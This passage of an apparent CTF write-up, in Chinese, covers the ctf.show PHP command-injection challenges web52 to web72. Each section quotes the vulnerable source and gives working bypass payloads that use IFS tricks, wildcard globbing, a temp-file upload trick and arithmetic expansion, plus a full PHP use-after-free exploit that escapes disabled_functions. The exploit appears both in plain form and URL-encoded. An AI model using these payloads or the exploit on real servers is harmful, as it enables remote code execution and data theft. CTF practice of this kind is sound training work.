http://efdac68a-4d21-4a65-b7bf-cbc9f8f0f7b9.challenge.ctf.show?c=ta''c<fla''g.php||
```

### [web52]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

payload:

```
http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ls${IFS}/||
```

![image-20230705222110720](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png)

```
http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ta''c${IFS}/fla''g||
```

![image-20230705222154582](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png)

### [web53]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

payload:

```
http://009c1d7c-5a7a-44a5-8a5c-9fdea5fa3cac.challenge.ctf.show/?c=ta''c${IFS}fla''g.php
```

### [web54]

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

先改名为`a.txt`：

```
http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/?c=mv${IFS}fl??.???${IFS}a.txt
```

然后直接访问

```
http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/a.txt
```

### [web55]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

**无字母RCE**

由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。

`?c=/bin/base64 flag.php`

```
http://09b4ab86-9c0f-4b01-ab1b-c62620f27051.challenge.ctf.show/?c=/???/????64 ????.???
```

![image-20230706153123230](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png)

复制出来base64解码

### [web56]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了所有的字母和数字，以及一系列的符号。

本题最值得推敲的点就是**无字母数字的命令执行**

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

我们上传到Linux系统中的文件，都会被存放到/tmp目录下，并且传入生成的临时文件，只有传入的php文件中含有大写字母，且默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母，而且可以发现，只有PHP生成的临时文件包含大写字母，因此可以使用方法来选择传入的php文件`/???/???[@-[]`

![image-20230707012445223](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png)

从ascii码表可以看出，大写字母是被@和[两个字符所包围的，因此[@-[]可以用来表示所有的大写字母。

<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706232826182.png" alt="image-20230706232826182" style="zoom:50%;" />

看了许多关于本题的博客，发现解题方法不外乎通过构造一个html poc：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://d06e4766-59a3-43fc-af3b-6dd6f1fd84a3.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

通过phpstudy搭建本地环境，我把它命名为`test.html`

然后进入`http://127.0.0.1/test.html`

![image-20230707005144151](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png)

通过该页面实现对题目的文件上传

在需要上传的php文件中写入

```
#!/bin/sh
ls
```

上传的同时开启抓包拦截，修改get传参部分

```
?c=.%20/???/????????[@-[]
```

并发送到repeater

<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005302632.png" alt="image-20230707005302632" style="zoom: 80%;" />

可以直接在repeater中修改所上传的文件内容，来获取flag
<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005412291.png" alt="image-20230707005412291" style="zoom: 50%;" />

### [web57]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

题目中已经提示flag在36.php中了，根据题目可知，我们只需要绕过过滤传参36即可

python脚本：

```python
data = "$((~$(("+"$((~$(())))"*37+"))))"
print(data)
```

> ```
> $((""))值为0,$((~$((""))))值为-1
> ```
>
> 注意的是：`${_}会输出上一次的执行结果`

![image-20230707013217343](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png)

payload:

```
http://cdc732c6-8cd0-470d-9010-35488663232b.challenge.ctf.show/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

传参之后页面是没有回显的，按ctrl+u查看源码可得到：
![image-20230707013302782](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png)

### [web58]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

直接用system()函数发现被禁了

![image-20230707014326061](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png)

可以用file_get_contents

payload:(POST传参)

```
c=echo file_get_contents("flag.php");
```

(记得查看网站源码来获取flag)

> web59/60/61/62/63/64/65/67
>
> 要注意有些题目的flag文件在根目录，有些是在网站目录
>
> payload：
>
> ```
> c=echo file_get_contents("flag.php");
> c=readfile("flag.php");
> c=var_dump(file('flag.php'));
> c=highlight_file("flag.php");
> c=show_source("flag.php");
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}#一行一行读取
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}#一行一个一个字符取
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
> ```
>
> https://blog.csdn.net/m0_62207170/article/details/129902182

[web59]跟58一模一样的题

### [web66]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

前端显示出来的代码长得跟前面一样，但过滤了很多函数，尝试了前面的payload都行不通

先查看根目录内容

```
c=print_r(scandir("/"));
```

或者可以用

```
c=var_dump(scandir('/'));
```

可以看到根目录下的flag.txt文件，随后

```
c=highlight_file("/flag.txt");
```

### [web68]

![image-20230707123323147](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707123323147.png)

直接禁用了highlight_file函数，显示根目录文件

```
c=var_dump(scandir('/'));
```

然后直接

```
c=include('/flag.txt');
```

### [web69]

尝试`c=include('index.php');`发现字节太大了 

![image-20230707124155302](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707124155302.png)

直接尝试include flag.txt，成功了

```
c=include('/flag.txt');
```

web70类似

### [web71]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

源码劫持了输出缓冲并且将数字和字母替换成了`?`

> ob_get_contents — 返回输出缓冲区的内容
> ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲

**题解1：**

在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：

```
ob_flush();
ob_end_flush();
```

payload：

```
c=include('/flag.txt');ob_flush();
```

**题解2：**

提前终止程序，即执行完代码直接退出，可以调用的函数有：

```
exit();
die();
```

payload：

```
c=include('/flag.txt');exit();
```

### [web72]

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

查看源代码， 用glob协议读取根目录

```php
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} 
exit(0);
?>
```

用**uaf脚本**命令执行,并url编码：

```
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) {

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10;
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
```

所以我们提交的payload：

```
c=function%20ctfshow(%24cmd)%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3ea)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20(new%20exception)-%3egettrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5b1%5d%5b'args'%5d))%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr(%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord(%24str%5b%24p%2b%24j%5d)%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str(%24ptr%2c%20%24m%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20(%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf(%22%25c%22%2c(%24ptr%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write(%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf(%22%25c%22%2c(%24v%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak(%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write(%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10)%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen(%24helper-%3ea)%3b%20%20%20%20%20%20%20%20%20if(%24s%20!%3d%208)%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20(%24s%20*%208)%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf(%24base)%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak(%24base%2c%200x10%2c%202)%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak(%24base%2c%200x20)%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak(%24base%2c%200x36%2c%202)%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak(%24base%2c%200x38%2c%202)%3b%20%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak(%24header%2c%200%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak(%24header%2c%204%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak(%24header%2c%200x10)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak(%24header%2c%200x28)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%20%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if(!%24data_addr%20%7c%7c%20!%24text_size%20%7c%7c%20!%24data_size)%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs(%24base%2c%20%24elf)%20%7b%20%20%20%20%20%20%20%20%20list(%24data_addr%2c%20%24text_size%2c%20%24data_size)%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20%24i%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x746e6174736e6f63)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20(%24i%20%2b%204)%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x786568326e6962)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24addr%2c%200%2c%207)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3d%3d%200x10102464c457f)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system(%24basic_funcs)%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak(%24addr)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak(%24f_entry%2c%200%2c%206)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3d%3d%200x6d6574737973)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2b%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while(%24f_entry%20!%3d%200)%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf(%24arg)%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln()%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(stristr(php_os%2c%20'win'))%20%7b%20%20%20%20%20%20%20%20%20die('this%20poc%20is%20for%20*nix%20systems%20only.')%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b)%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20trigger_uaf('x')%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b'args'%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20(%24x)%20%7b%20%7d%3b%20%20%20%20%20%20if(strlen(%24abc)%20%3d%3d%2079%20%7c%7c%20strlen(%24abc)%20%3d%3d%200)%20%7b%20%20%20%20%20%20%20%20%20die(%22uaf%20failed%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr(%24abc%2c%200)%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr(%24abc%2c%200x58)%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write(%24abc%2c%200x60%2c%202)%3b%20%20%20%20%20write(%24abc%2c%200x70%2c%206)%3b%20%20%20%20%20%20write(%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60)%3b%20%20%20%20%20write(%24abc%2c%200x18%2c%200xa)%3b%20%20%20%20%20%20%24c